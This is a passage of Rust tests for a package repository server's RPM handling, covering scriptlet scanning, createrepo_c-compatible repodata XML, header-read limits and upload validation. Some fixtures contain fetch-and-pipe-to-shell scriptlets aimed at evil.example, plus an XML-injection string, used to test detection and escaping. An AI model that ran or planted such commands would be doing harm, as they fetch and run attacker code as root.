            index.extend_from_slice(&(store.len() as u32).to_be_bytes());
            index.extend_from_slice(&1u32.to_be_bytes());
            store.extend_from_slice(value.as_bytes());
            store.push(0);
        }
        let mut out = vec![0x8e, 0xad, 0xe8, 1, 0, 0, 0, 0];
        out.extend_from_slice(&(tags.len() as u32).to_be_bytes());
        out.extend_from_slice(&(store.len() as u32).to_be_bytes());
        out.extend_from_slice(&index);
        out.extend_from_slice(&store);
        out
    }

    fn rpm_with(tags: &[(u32, &str)]) -> Vec<u8> {
        let mut data = rpm_lead_and_signature();
        data.extend_from_slice(&header_section(tags));
        data
    }

    const BASE: [(u32, &str); 2] = [(RPMTAG_NAME, "pkg"), (RPMTAG_VERSION, "1.0")];

    #[test]
    fn hostile_post_scriptlet_is_found_and_flagged() {
        let mut tags = BASE.to_vec();
        tags.push((RPMTAG_POSTIN, "curl -s https://evil.example/x.sh | sh\n"));
        tags.push((RPMTAG_POSTINPROG, "/bin/sh"));
        let (scripts, unanalyzed, completeness) = extract_rpm_scriptlets(&rpm_with(&tags));

        assert_eq!(completeness, Completeness::Complete);
        assert!(unanalyzed.is_empty());
        assert_eq!(scripts.len(), 1);
        let script = &scripts[0];
        assert_eq!(script.kind, ScriptKind::RpmPost);
        assert_eq!(script.path, "rpm:header#POSTIN");
        assert!(script.kind.runs_as_root());
        assert!(script.body.starts_with("curl -s"));

        let findings = analyze_script(script);
        assert!(
            findings.iter().any(|f| f.severity >= ScriptSeverity::High),
            "curl | sh in a root-run %post must be a high-severity finding: {findings:?}"
        );
    }

    #[test]
    fn package_without_scriptlets_is_complete_and_empty() {
        let (scripts, unanalyzed, completeness) = extract_rpm_scriptlets(&rpm_with(&BASE));
        assert!(scripts.is_empty());
        assert!(unanalyzed.is_empty());
        assert_eq!(completeness, Completeness::Complete);
    }

    #[test]
    fn every_scriptlet_tag_is_recognised_and_runs_as_root() {
        let mut tags = BASE.to_vec();
        tags.extend([
            (RPMTAG_PREIN, "echo pre"),
            (RPMTAG_POSTIN, "echo post"),
            (RPMTAG_PREUN, "echo preun"),
            (RPMTAG_POSTUN, "echo postun"),
            (RPMTAG_PREINPROG, "/bin/sh"),
            (RPMTAG_PREUNPROG, "/bin/sh"),
            (RPMTAG_POSTUNPROG, "/bin/sh"),
        ]);
        let (scripts, unanalyzed, completeness) = extract_rpm_scriptlets(&rpm_with(&tags));

        assert_eq!(completeness, Completeness::Complete);
        assert!(unanalyzed.is_empty());
        let seen: Vec<(ScriptKind, &str)> =
            scripts.iter().map(|s| (s.kind, s.path.as_str())).collect();
        assert_eq!(
            seen,
            vec![
                (ScriptKind::RpmPre, "rpm:header#PREIN"),
                (ScriptKind::RpmPost, "rpm:header#POSTIN"),
                (ScriptKind::RpmPreUn, "rpm:header#PREUN"),
                (ScriptKind::RpmPostUn, "rpm:header#POSTUN"),
            ]
        );
        assert!(scripts.iter().all(|s| s.kind.runs_as_root()));
    }

    /// `%post -p /sbin/ldconfig` stores no body, only the interpreter. That
    /// program still runs as root, so it is recorded; a bodiless default
    /// shell interpreter is a no-op and is not.
    #[test]
    fn interpreter_only_scriptlet_is_recorded_unless_it_is_the_default_shell() {
        let mut tags = BASE.to_vec();
        tags.push((RPMTAG_POSTINPROG, "/sbin/ldconfig"));
        tags.push((RPMTAG_PREUNPROG, "/bin/sh"));
        let (scripts, unanalyzed, completeness) = extract_rpm_scriptlets(&rpm_with(&tags));

        assert_eq!(completeness, Completeness::Complete);
        assert!(unanalyzed.is_empty());
        assert_eq!(scripts.len(), 1);
        assert_eq!(scripts[0].kind, ScriptKind::RpmPost);
        assert_eq!(scripts[0].path, "rpm:header#POSTINPROG");
        assert_eq!(scripts[0].body, "/sbin/ldconfig");
    }

    /// `%post -p <lua>` is legal and not shell. The script is still recorded
    /// (it runs as root) but is handed back un-analysed with a reason, and
    /// the package stays `Complete`: every byte was read.
    #[test]
    fn non_shell_scriptlet_is_recorded_but_not_scanned() {
        let mut tags = BASE.to_vec();
        tags.push((
            RPMTAG_POSTIN,
            "os.execute('curl http://evil.example/p | sh')",
        ));
        tags.push((RPMTAG_POSTINPROG, "<lua>"));
        tags.push((RPMTAG_PREUN, "echo bye"));
        tags.push((RPMTAG_PREUNPROG, "/usr/bin/env bash"));
        let (scripts, unanalyzed, completeness) = extract_rpm_scriptlets(&rpm_with(&tags));

        assert_eq!(completeness, Completeness::Complete);
        assert_eq!(scripts.len(), 1, "the bash %preun is still scanned");
        assert_eq!(scripts[0].kind, ScriptKind::RpmPreUn);

        assert_eq!(unanalyzed.len(), 1);
        let UnanalyzedScript {
            script,
            original_size_bytes,
            reason,
        } = &unanalyzed[0];
        assert_eq!(script.kind, ScriptKind::RpmPost);
        assert_eq!(script.path, "rpm:header#POSTIN");
        assert!(script.kind.runs_as_root());
        assert!(script.body.contains("os.execute"));
        assert_eq!(*original_size_bytes, script.body.len() as i64);
        assert_eq!(
            reason,
            "POSTIN runs under <lua>, which the shell rules do not cover"
        );
    }

    /// The defect this epic exists to remove: an unreadable package must never
    /// render as clean. Every shape of "could not read the header" is
    /// `NotRead`, including the parser's silent lead-only fallback.
    #[test]
    fn unreadable_rpms_are_not_read_never_complete() {
        let not_rpm = b"definitely not an rpm".to_vec();
        let lead_only = rpm_lead_and_signature();
        let mut truncated_header = rpm_with(&BASE);
        truncated_header.truncate(truncated_header.len() - 3);

        for (label, body) in [
            ("not an rpm", not_rpm),
            ("lead and signature only", lead_only),
            ("truncated main header", truncated_header),
        ] {
            let (scripts, unanalyzed, completeness) = extract_rpm_scriptlets(&body);
            assert!(scripts.is_empty(), "{label}");
            assert!(unanalyzed.is_empty(), "{label}");
            assert!(
                matches!(completeness, Completeness::NotRead { .. }),
                "{label}: expected NotRead, got {completeness:?}"
            );
        }
    }
}

// ---------------------------------------------------------------------------
// #3801: primary.xml / filelists.xml must carry the header's dependency
// metadata in createrepo_c's exact format, or dnf resolves no dependencies.
// ---------------------------------------------------------------------------

#[cfg(ak_test_shard = "handlers-2")]
#[cfg(test)]
mod repodata_deps_tests {
    use super::*;
    use crate::api::handlers::test_db_helpers as tdh;

    /// Built by `tests/fixtures/ak-deps-test.spec` (rpmbuild, Fedora): epoch 2,
    /// versioned/unversioned/pre requires, virtual provides, conflicts,
    /// obsoletes, weak deps, a dir, a ghost and a `/usr/bin` file.
    const DEPS_RPM: &[u8] = include_bytes!("../../../tests/fixtures/ak-deps-test-1.5-3.noarch.rpm");
    const DEPS_FILENAME: &str = "ak-deps-test-1.5-3.noarch.rpm";
    /// `createrepo_c` 1.2.1's `primary.xml`/`filelists.xml` for exactly that
    /// file: the reference the rendered documents are compared against.
    const CREATEREPO_PRIMARY: &str =
        include_str!("../../../tests/fixtures/ak-deps-test-1.5-3.noarch.createrepo-primary.xml");
    const CREATEREPO_FILELISTS: &str =
        include_str!("../../../tests/fixtures/ak-deps-test-1.5-3.noarch.createrepo-filelists.xml");

    fn deps_artifact() -> RpmArtifact {
        RpmArtifact {
            id: uuid::Uuid::new_v4(),
            path: format!("packages/{DEPS_FILENAME}"),
            name: "ak-deps-test".to_string(),
            version: Some("1.5-3".to_string()),
            size_bytes: DEPS_RPM.len() as i64,
            checksum_sha256: sha256_hex(DEPS_RPM),
            storage_key: String::new(),
            metadata: build_rpm_artifact_metadata(DEPS_FILENAME, DEPS_RPM).expect("not rejected"),
            updated_at: chrono::DateTime::UNIX_EPOCH,
        }
    }

    /// The `<package ...>...</package>` block's lines, trimmed of indentation
    /// (the two generators indent differently), minus the lines that are
    /// legitimately repository-specific: `<location>` (keeper serves
    /// `packages/<file>`) and `<time>` (`file=` is the file mtime).
    fn package_lines(doc: &str) -> Vec<String> {
        let start = doc.find("<package ").expect("a <package> element");
        let end = doc.rfind("</package>").expect("a </package> close") + "</package>".len();
        doc[start..end]
            .lines()
            .map(str::trim)
            .filter(|l| !l.starts_with("<location ") && !l.starts_with("<time "))
            .map(str::to_string)
            .collect()
    }

    /// `n` copies of the deps fixture under distinct paths and times, in
    /// the render order.
    fn deps_artifacts(n: i64) -> Vec<RpmArtifact> {
        (0..n)
            .map(|i| RpmArtifact {
                path: format!("packages/ak-deps-test-1.5-{i}.noarch.rpm"),
                updated_at: chrono::DateTime::from_timestamp(1_700_000_000 + i, 0)
                    .expect("valid timestamp"),
                ..deps_artifact()
            })
            .collect()
    }

    /// #4544: the streamed documents are the bytes of the whole-slice
    /// generators gzipped in one call (as 1.11 served them) while they stay
    /// under the spill size, `repomd.xml` advertises their checksums and
    /// open sizes, and the batch size never changes a byte (#2636). Past the
    /// spill size the documents still decompress to the same bytes and stay
    /// a pure function of the rows.
    #[test]
    fn batched_render_matches_whole_slice_render_4544() {
        use std::io::Read;
        let gunzip = |gz: &[u8]| {
            let mut out = Vec::new();
            flate2::read::GzDecoder::new(gz)
                .read_to_end(&mut out)
                .expect("gunzip");
            out
        };
        let artifacts = deps_artifacts(7);
        let infos = repodata_infos(&artifacts);
        let whole = render_repodata_at(&artifacts, "");
        let repomd = String::from_utf8(whole.repomd_xml.to_vec()).expect("utf8");
        for (gz, xml) in [
            (
                &whole.primary_gz,
                generate_primary_xml_with(&artifacts, &infos, ""),
            ),
            (
                &whole.filelists_gz,
                generate_filelists_xml_with(&artifacts, &infos),
            ),
            (&whole.other_gz, generate_other_xml_with(&artifacts, &infos)),
        ] {
            assert_eq!(gunzip(gz), xml.as_bytes());
            assert_eq!(*gz, gzip_bytes(xml.as_bytes()), "unspilled: as 1.11");
            assert!(repomd.contains(&sha256_hex(gz)), "{repomd}");
            assert!(repomd.contains(&sha256_hex(xml.as_bytes())), "{repomd}");
            assert!(
                repomd.contains(&format!("<open-size>{}</open-size>", xml.len())),
                "{repomd}"
            );
        }
        for size in [1, 2, 3, 7] {
            let mut writer = RepodataWriter::new(artifacts.len(), "");
            for chunk in artifacts.chunks(size) {
                writer.push_batch(chunk);
            }
            assert_eq!(writer.finish(), whole, "batches of {size}");
        }
        // A tiny spill size forces every document through the streaming
        // encoder: same uncompressed bytes, deterministic across batchings.
        let spilled = |size: usize| {
            let mut writer = RepodataWriter::with_spill(artifacts.len(), "", 1);
            for chunk in artifacts.chunks(size) {
                writer.push_batch(chunk);
            }
            writer.finish()
        };
        let first = spilled(1);
        assert_eq!(spilled(3), first);
        assert_eq!(gunzip(&first.filelists_gz), gunzip(&whole.filelists_gz));
        assert_eq!(gunzip(&first.primary_gz), gunzip(&whole.primary_gz));
        assert!(
            repomd.contains("<revision>1700000006</revision>"),
            "{repomd}"
        );
    }

    /// #4544: the request-path render reads the root as a stream and holds
    /// one batch of metadata at a time (the OOM was every row's metadata
    /// plus every uncompressed document in memory at once), and its bytes
    /// are those of the in-memory render of the same rows.
    #[tokio::test]
    async fn streamed_render_holds_one_batch_and_matches_in_memory_render_4544() {
        let Some(f) = tdh::Fixture::setup("local", "rpm").await else {
            return;
        };
        let meta = deps_artifact().metadata.expect("fixture metadata");
        for i in 0..6 {
            let (id,): (uuid::Uuid,) = sqlx::query_as(
                "INSERT INTO artifacts (repository_id, path, name, version, size_bytes, \
                 checksum_sha256, content_type, storage_key, uploaded_by) \
                 VALUES ($1, $2, 'ak-deps-test', '1.5-3', $3, $4, 'application/x-rpm', $5, $6) \
                 RETURNING id",
            )
            .bind(f.repo_id)
            .bind(format!("packages/ak-deps-test-1.5-{i}.noarch.rpm"))
            .bind(DEPS_RPM.len() as i64)
            .bind(sha256_hex(DEPS_RPM))
            .bind(format!(
                "rpm/{}/ak-deps-test-1.5-{i}.noarch.rpm",
                f.repo_key
            ))
            .bind(f.user_id)
            .fetch_one(&f.pool)
            .await
            .expect("insert artifact");
            sqlx::query(
                "INSERT INTO artifact_metadata (artifact_id, format, metadata) \
                 VALUES ($1, 'rpm', $2)",
            )
            .bind(id)
            .bind(&meta)
            .execute(&f.pool)
            .await
            .expect("insert metadata");
        }

        let budget = json_weight(&meta) * 2;
        let (streamed, stats) = render_repodata_streamed(&f.state, &[f.repo_id], "", budget)
            .await
            .expect("streamed render");
        assert_eq!(stats.packages, 6);
        assert_eq!(stats.batches, 3, "{stats:?}");
        assert_eq!(stats.max_batch_rows, 2, "{stats:?}");
        assert!(stats.max_batch_bytes <= budget, "{stats:?}");

        let rows = collect_repodata_artifacts(&f.pool, &[f.repo_id])
            .await
            .expect("collect rows");
        assert_eq!(streamed, render_repodata_at(&rows, ""));
        let primary = {
            use std::io::Read;
            let mut xml = String::new();
            flate2::read::GzDecoder::new(&streamed.primary_gz[..])
                .read_to_string(&mut xml)
                .expect("gunzip");
            xml
        };
        assert!(primary.contains(r#"packages="6""#), "{primary}");
        assert_eq!(primary.matches("<package ").count(), 6);

        // An empty budget still makes progress: one package per batch.
        let (_, stats) = render_repodata_streamed(&f.state, &[f.repo_id], "", 0)
            .await
            .expect("streamed render");
        assert_eq!((stats.batches, stats.max_batch_rows), (6, 1));
    }

    /// Well-formedness: dnf/libsolv reject a document that does not parse.
    fn assert_well_formed(doc: &str) {
        let mut reader = quick_xml::Reader::from_str(doc);
        loop {
            match reader.read_event() {
                Ok(quick_xml::events::Event::Eof) => break,
                Ok(_) => {}
                Err(e) => panic!("rendered XML is not well-formed: {e}\n{doc}"),
            }
        }
    }

    #[test]
    fn upload_metadata_records_dependency_block() {
        let meta = build_rpm_artifact_metadata(DEPS_FILENAME, DEPS_RPM)
            .expect("not rejected")
            .unwrap();
        let block = &meta[RPM_REPODATA_KEY];
        assert_eq!(block["v"], RPM_REPODATA_INFO_VERSION);
        let requires: Vec<&str> = block["requires"]
            .as_array()
            .expect("requires recorded")
            .iter()
            .map(|e| e["name"].as_str().unwrap())
            .collect();
        assert!(requires.contains(&"openssl11-custom-libs"), "{requires:?}");
        assert!(
            requires.iter().all(|r| !r.starts_with("rpmlib(")),
            "rpmlib() pseudo-requires are omitted like createrepo_c: {requires:?}"
        );
    }

    /// The core #3801 regression: the rendered `<package>` entry — above all
    /// its `<format>` block with provides/requires/conflicts/obsoletes and the
    /// weak deps — must be exactly what createrepo_c writes for the same file,
    /// element order included.
    #[test]
    fn primary_xml_package_matches_createrepo_c() {
        let xml = generate_primary_xml(&[deps_artifact()]);
        assert_well_formed(&xml);
        assert!(
            xml.contains(r#"<rpm:entry name="openssl11-custom-libs"/>"#),
            "primary.xml must declare the header's requires (#3801): {xml}"
        );
        assert_eq!(
            package_lines(&xml),
            package_lines(CREATEREPO_PRIMARY),
            "rendered primary.xml package entry differs from createrepo_c:\n{xml}"
        );
    }

    #[test]
    fn filelists_xml_package_matches_createrepo_c() {
        let xml = generate_filelists_xml(&[deps_artifact()]);
        assert_well_formed(&xml);
        assert_eq!(
            package_lines(&xml),
            package_lines(CREATEREPO_FILELISTS),
            "rendered filelists.xml package entry differs from createrepo_c:\n{xml}"
        );
    }

    /// A stored block in an unknown shape is ignored (and so re-derived by the
    /// heal) rather than half-rendered.
    #[test]
    fn repodata_block_with_other_version_is_ignored() {
        let mut a = deps_artifact();
        a.metadata.as_mut().unwrap()[RPM_REPODATA_KEY]["v"] = serde_json::json!(0);
        assert!(rpm_repodata_info(&a).is_none());
        let xml = generate_primary_xml(&[a]);
        assert!(!xml.contains("<rpm:requires>"), "{xml}");
        assert_well_formed(&xml);
    }

    async fn primary_xml(f: &tdh::Fixture) -> String {
        use flate2::read::GzDecoder;
        use std::io::Read;
        let (status, body) = tdh::send(
            f.router_anon(super::router()),
            tdh::get(format!("/{}/repodata/primary.xml.gz", f.repo_key)),
        )
        .await;
        assert_eq!(status, StatusCode::OK, "primary.xml.gz");
        let mut xml = String::new();
        GzDecoder::new(&body[..])
            .read_to_string(&mut xml)
            .expect("decompress primary.xml.gz");
        xml
    }

    /// End to end through the native `PUT /rpm/{key}/packages/{file}` path the
    /// issue reports: the served primary.xml.gz carries the requires.
    #[tokio::test]
    async fn native_upload_serves_dependency_metadata() {
        let Some(f) = tdh::Fixture::setup("local", "rpm").await else {
            return;
        };
        let (status, body) = tdh::send(
            f.router_with_auth(super::router()),
            tdh::put(
                format!("/{}/packages/{DEPS_FILENAME}", f.repo_key),
                bytes::Bytes::from_static(DEPS_RPM),
            ),
        )
        .await;
        let xml = if status.is_success() {
            primary_xml(&f).await
        } else {
            String::new()
        };
        f.teardown().await;

        assert!(
            status.is_success(),
            "rpm upload failed: {status} {}",
            String::from_utf8_lossy(&body)
        );
        assert!(
            xml.contains(r#"<rpm:entry name="openssl11-custom-libs"/>"#),
            "served primary.xml must carry the header's requires (#3801): {xml}"
        );
        assert!(
            xml.contains(r#"<rpm:entry name="ak-deps-virtual" flags="EQ" epoch="0" ver="1.0"/>"#),
            "{xml}"
        );
        assert!(
            xml.contains(r#"<version epoch="2" ver="1.5" rel="3"/>"#),
            "{xml}"
        );
    }

    /// Packages stored before the fix have no repodata block. The render
    /// re-derives it from the stored header and persists it, so no manual
    /// backfill is needed.
    #[tokio::test]
    async fn legacy_package_is_healed_at_render() {
        let Some(f) = tdh::Fixture::setup("local", "rpm").await else {
            return;
        };
        let repo = f.repo_info("local", None);
        let key = format!("rpm/{}/{DEPS_FILENAME}", f.repo_id);
        let artifact_id = tdh::seed_artifact(
            &f.state,
            &f.pool,
            &repo,
            &key,
            &format!("packages/{DEPS_FILENAME}"),
            "ak-deps-test",
            "1.5-3",
            "application/x-rpm",
            bytes::Bytes::from_static(DEPS_RPM),
            f.user_id,
        )
        .await;
        // The pre-#3801 upload shape: header text fields, no repodata block.
        let mut legacy = build_rpm_artifact_metadata(DEPS_FILENAME, DEPS_RPM)
            .expect("not rejected")
            .unwrap();
        legacy.as_object_mut().unwrap().remove(RPM_REPODATA_KEY);
        proxy_helpers::record_artifact_metadata(&f.pool, artifact_id, f.repo_id, "rpm", &legacy)
            .await;

        let xml = primary_xml(&f).await;
        let stored: Option<serde_json::Value> =
            sqlx::query_scalar("SELECT metadata FROM artifact_metadata WHERE artifact_id = $1")
                .bind(artifact_id)
                .fetch_optional(&f.pool)
                .await
                .unwrap();
        f.teardown().await;

        assert!(
            xml.contains(r#"<rpm:entry name="openssl11-custom-libs"/>"#),
            "a pre-fix package must render its requires after the heal: {xml}"
        );
        let stored = stored.expect("metadata row");
        assert_eq!(
            stored[RPM_REPODATA_KEY]["v"], RPM_REPODATA_INFO_VERSION,
            "the healed block must be persisted so it is derived once: {stored}"
        );
        assert_eq!(stored["summary"], legacy["summary"], "existing fields kept");
    }

    // -----------------------------------------------------------------------
    // read_rpm_header_prefix: the ranged-read grow loop and its bounds.
    // -----------------------------------------------------------------------

    /// Lead + empty signature header + a main header holding NAME and a BIN
    /// blob of `blob_len` bytes; `declared_hsize` overrides the store size
    /// the header CLAIMS (the bytes written are always the real store).
    fn synthetic_rpm(blob_len: usize, declared_hsize: Option<u32>) -> Vec<u8> {
        let mut store = b"bigheader\0".to_vec();
        let blob_off = store.len() as u32;
        store.resize(store.len() + blob_len, 0xab);
        let entries: [(u32, u32, u32, u32); 2] =
            [(1000, 6, 0, 1), (1012, 7, blob_off, blob_len as u32)];
        let mut p = vec![0u8; 96];
        p[..4].copy_from_slice(&[0xed, 0xab, 0xee, 0xdb]);
        p[4] = 3;
        p.extend_from_slice(&[0x8e, 0xad, 0xe8, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]);
        p.extend_from_slice(&[0x8e, 0xad, 0xe8, 1, 0, 0, 0, 0]);
        p.extend_from_slice(&(entries.len() as u32).to_be_bytes());
        p.extend_from_slice(&declared_hsize.unwrap_or(store.len() as u32).to_be_bytes());
        for (tag, ty, off, count) in entries {
            for v in [tag, ty, off, count] {
                p.extend_from_slice(&v.to_be_bytes());
            }
        }
        p.extend_from_slice(&store);
        p
    }

    async fn stored(
        bytes: &[u8],
    ) -> (
        tempfile::TempDir,
        crate::storage::filesystem::FilesystemStorage,
    ) {
        use crate::storage::StorageBackend;
        let dir = tempfile::tempdir().unwrap();
        let fs = crate::storage::filesystem::FilesystemStorage::new(dir.path());
        fs.put("pkg.rpm", Bytes::copy_from_slice(bytes))
            .await
            .unwrap();
        (dir, fs)
    }

    /// A header larger than the first 64 KiB read (big file lists do this)
    /// must be healed: the loop grows the read to exactly the header end.
    #[tokio::test]
    async fn header_prefix_grows_past_first_64k_read() {
        // Header ends ~100 KiB in; 50 KiB of payload follows it.
        let mut pkg = synthetic_rpm(100 * 1024, None);
        let header_end = pkg.len();
        pkg.extend_from_slice(&vec![0u8; 50 * 1024]);
        let (_dir, fs) = stored(&pkg).await;

        let prefix = read_rpm_header_prefix_from(&fs, "pkg.rpm", pkg.len() as i64)
            .await
            .expect("prefix");
        assert!(header_end > 64 * 1024);
        assert_eq!(
            prefix.len(),
            header_end,
            "grown to the header end, not the payload"
        );
        let info = RpmHandler::parse_rpm_repodata_info(&prefix).expect("grown prefix parses");
        assert_eq!(info.header_end as usize, header_end);
    }

    /// A header claiming more bytes than the object holds is not chased: the
    /// first read comes back unparsed-but-bounded (`needed <= size` guard).
    #[tokio::test]
    async fn header_prefix_does_not_grow_past_stored_size() {
        let pkg = synthetic_rpm(70 * 1024, Some(10 * 1024 * 1024));
        let (_dir, fs) = stored(&pkg).await;
        let prefix = read_rpm_header_prefix_from(&fs, "pkg.rpm", pkg.len() as i64)
            .await
            .expect("prefix");
        assert_eq!(prefix.len(), 64 * 1024);
        assert!(RpmHandler::parse_rpm_repodata_info(&prefix).is_err());
    }

    /// A header claiming more than [`RPM_HEAL_HEADER_LIMIT`] is not chased
    /// even when the recorded object size would allow it.
    #[tokio::test]
    async fn header_prefix_does_not_grow_past_heal_limit() {
        let claimed = RPM_HEAL_HEADER_LIMIT as u32 + 1;
        let pkg = synthetic_rpm(70 * 1024, Some(claimed));
        let (_dir, fs) = stored(&pkg).await;
        // The artifact row says the object is big enough to hold the header,
        // so only the cap stops the read.
        let recorded_size = 2 * RPM_HEAL_HEADER_LIMIT as i64;
        assert!(
            RpmHandler::header_bytes_needed(&pkg[..64 * 1024]).unwrap() > RPM_HEAL_HEADER_LIMIT
        );
        let prefix = read_rpm_header_prefix_from(&fs, "pkg.rpm", recorded_size)
            .await
            .expect("prefix");
        assert_eq!(prefix.len(), 64 * 1024);
    }

    /// A negative recorded size (corrupt row) is rejected, not cast.
    #[tokio::test]
    async fn header_prefix_rejects_negative_size() {
        let pkg = synthetic_rpm(16, None);
        let (_dir, fs) = stored(&pkg).await;
        assert!(matches!(
            read_rpm_header_prefix_from(&fs, "pkg.rpm", -1).await,
            Err(HeaderRead::Permanent(_))
        ));
    }

    /// A missing object is transient: retried, not marked unparseable.
    #[tokio::test]
    async fn header_prefix_missing_object_is_transient() {
        // A mount blip or an in-progress storage migration looks exactly
        // like a missing object: never settle a package on it alone.
        let (_dir, fs) = stored(b"x").await;
        assert!(matches!(
            read_rpm_header_prefix_from(&fs, "absent.rpm", 4096).await,
            Err(HeaderRead::Transient(_))
        ));
    }

    // -----------------------------------------------------------------------
    // Review follow-ups: self-provided requires parity, control characters,
    // upload-time limits, heal markers and merge.
    // -----------------------------------------------------------------------

    const SELFPROV_RPM: &[u8] =
        include_bytes!("../../../tests/fixtures/ak-selfprov-test-2.0-1.noarch.rpm");
    const SELFPROV_PRIMARY: &str = include_str!(
        "../../../tests/fixtures/ak-selfprov-test-2.0-1.noarch.createrepo-primary.xml"
    );

    #[test]
    fn primary_xml_self_provided_requires_match_createrepo_c() {
        let filename = "ak-selfprov-test-2.0-1.noarch.rpm";
        let a = RpmArtifact {
            id: uuid::Uuid::new_v4(),
            path: format!("packages/{filename}"),
            name: "ak-selfprov-test".to_string(),
            version: Some("2.0-1".to_string()),
            size_bytes: SELFPROV_RPM.len() as i64,
            checksum_sha256: sha256_hex(SELFPROV_RPM),
            storage_key: String::new(),
            metadata: build_rpm_artifact_metadata(filename, SELFPROV_RPM).expect("not rejected"),
            updated_at: chrono::DateTime::UNIX_EPOCH,
        };
        let xml = generate_primary_xml(&[a]);
        assert_well_formed(&xml);
        assert_eq!(
            package_lines(&xml),
            package_lines(SELFPROV_PRIMARY),
            "{xml}"
        );
    }

    /// Lead + empty signature header + a main header with NAME/VERSION/
    /// RELEASE/ARCH strings, a REQUIRENAME array and optionally a BASENAMES
    /// array of `basenames` empty strings.
    fn rpm_with_requires(requires: &[&str], basenames: u32) -> Vec<u8> {
        let mut store = Vec::new();
        let mut entries: Vec<(u32, u32, u32, u32)> = Vec::new();
        for (tag, value) in [
            (1000u32, "hostile"),
            (1001, "1.0"),
            (1002, "1"),
            (1022, "noarch"),
        ] {
            entries.push((tag, 6, store.len() as u32, 1));
            store.extend_from_slice(value.as_bytes());
            store.push(0);
        }
        entries.push((1049, 8, store.len() as u32, requires.len() as u32));
        for r in requires {
            store.extend_from_slice(r.as_bytes());
            store.push(0);
        }
        // REQUIREFLAGS (all 0) and REQUIREVERSION (all empty): createrepo_c
        // reads a dependency type only with all three tags present.
        while store.len() % 4 != 0 {
            store.push(0);
        }
        entries.push((1048, 4, store.len() as u32, requires.len() as u32));
        store.extend(std::iter::repeat_n(0u8, requires.len() * 4));
        entries.push((1050, 8, store.len() as u32, requires.len() as u32));
        store.extend(std::iter::repeat_n(0u8, requires.len()));
        if basenames > 0 {
            entries.push((1117, 8, store.len() as u32, basenames));
            store.resize(store.len() + basenames as usize, 0);
        }
        let mut p = vec![0u8; 96];
        p[..4].copy_from_slice(&[0xed, 0xab, 0xee, 0xdb]);
        p[4] = 3;
        p.extend_from_slice(&[0x8e, 0xad, 0xe8, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]);
        p.extend_from_slice(&[0x8e, 0xad, 0xe8, 1, 0, 0, 0, 0]);
        p.extend_from_slice(&(entries.len() as u32).to_be_bytes());
        p.extend_from_slice(&(store.len() as u32).to_be_bytes());
        for (tag, ty, off, count) in entries {
            for v in [tag, ty, off, count] {
                p.extend_from_slice(&v.to_be_bytes());
            }
        }
        p.extend_from_slice(&store);
        p
    }

    #[test]
    fn control_characters_are_refused_at_upload() {
        let pkg = rpm_with_requires(&["ok", "bad\u{1}name"], 0);
        let err = build_rpm_artifact_metadata("hostile-1.0-1.noarch.rpm", &pkg)
            .expect_err("a control character in a dependency must be refused");
        assert!(err.0.contains("control characters"), "{}", err.0);
        // Tab/LF/CR are legal XML and pass.
        let ok = rpm_with_requires(&["tab\tname"], 0);
        assert!(build_rpm_artifact_metadata("hostile-1.0-1.noarch.rpm", &ok).is_ok());
    }

    #[test]
    fn over_budget_header_is_refused_at_upload() {
        let pkg = rpm_with_requires(
            &["x"],
            crate::formats::rpm::RPM_MAX_LIST_ELEMENTS as u32 + 1,
        );
        let err = build_rpm_artifact_metadata("hostile-1.0-1.noarch.rpm", &pkg)
            .expect_err("an over-budget header must be refused");
        assert!(err.0.contains("entries"), "{}", err.0);
    }

    /// Rows stored before the upload check may still carry control
    /// characters: the renderer drops them rather than emit ill-formed XML.
    #[test]
    fn legacy_control_characters_never_reach_the_xml() {
        let mut a = deps_artifact();
        let meta = a.metadata.as_mut().unwrap();
        meta["summary"] = serde_json::json!("sum\u{1}mary\u{1b}[31m");
        meta[RPM_REPODATA_KEY]["requires"][0]["name"] = serde_json::json!("/bin/\u{7}sh");
        meta[RPM_REPODATA_KEY]["files"][0]["path"] = serde_json::json!("/etc/\u{0}x");
        let a = vec![a];
        for xml in [
            generate_primary_xml(&a),
            generate_filelists_xml(&a),
            generate_other_xml(&a),
        ] {
            assert_well_formed(&xml);
            assert!(!xml.chars().any(is_forbidden_xml_control), "{xml:?}");
        }
        assert_eq!(xml_escape("a\u{1}b\tc\u{fffe}"), "ab\tc");
    }

    #[test]
    fn other_xml_escapes_arch() {
        let mut a = deps_artifact();
        a.metadata.as_mut().unwrap()["arch"] = serde_json::json!("x86_64\"><evil/>");
        let xml = generate_other_xml(&[a]);
        assert_well_formed(&xml);
        assert!(
            xml.contains("arch=\"x86_64&quot;&gt;&lt;evil/&gt;\""),
            "{xml}"
        );
    }

    /// The native PUT refuses an over-limit header with 400 and stores
    /// nothing.
    #[tokio::test]
    async fn native_upload_rejects_over_limit_header() {
        let Some(f) = tdh::Fixture::setup("local", "rpm").await else {
            return;
        };
        let pkg = rpm_with_requires(
            &["x"],
            crate::formats::rpm::RPM_MAX_LIST_ELEMENTS as u32 + 1,
        );
        let (status, _) = tdh::send(
            f.router_with_auth(super::router()),
            tdh::put(
                format!("/{}/packages/hostile-1.0-1.noarch.rpm", f.repo_key),
                bytes::Bytes::from(pkg),
            ),
        )
        .await;
        let rows: i64 = sqlx::query_scalar(
            "SELECT COUNT(*) FROM artifacts WHERE repository_id = $1 AND is_deleted = false",
        )
        .bind(f.repo_id)
        .fetch_one(&f.pool)
        .await
        .unwrap();
        f.teardown().await;
        assert_eq!(status, StatusCode::BAD_REQUEST);
        assert_eq!(rows, 0, "a refused upload must not create an artifact");
    }

    /// #4216: the full-path PUT of a depth-enabled repository goes through
    /// the same parse-before-write as the `packages/` route: an over-limit
    /// header is refused with 400 before the content-addressed object or any
    /// row is written.
    #[tokio::test]
    async fn depth_full_path_upload_rejects_over_limit_header_before_storing() {
        let Some(f) = tdh::Fixture::setup("local", "rpm").await else {
            return;
        };
        let mut conn = f.pool.acquire().await.unwrap();
        crate::services::rpm_layout::set_depth(&mut conn, f.repo_id, 1)
            .await
            .unwrap();
        drop(conn);
        let pkg = rpm_with_requires(
            &["x"],
            crate::formats::rpm::RPM_MAX_LIST_ELEMENTS as u32 + 1,
        );
        let key = crate::services::artifact_service::ArtifactService::storage_key_from_checksum(
            &sha256_hex(&pkg),
        );
        let (status, _) = tdh::send(
            f.router_with_auth(super::router()),
            tdh::put(
                format!("/{}/build-a/hostile-1.0-1.noarch.rpm", f.repo_key),
                bytes::Bytes::from(pkg),
            ),
        )
        .await;
        let rows: i64 =
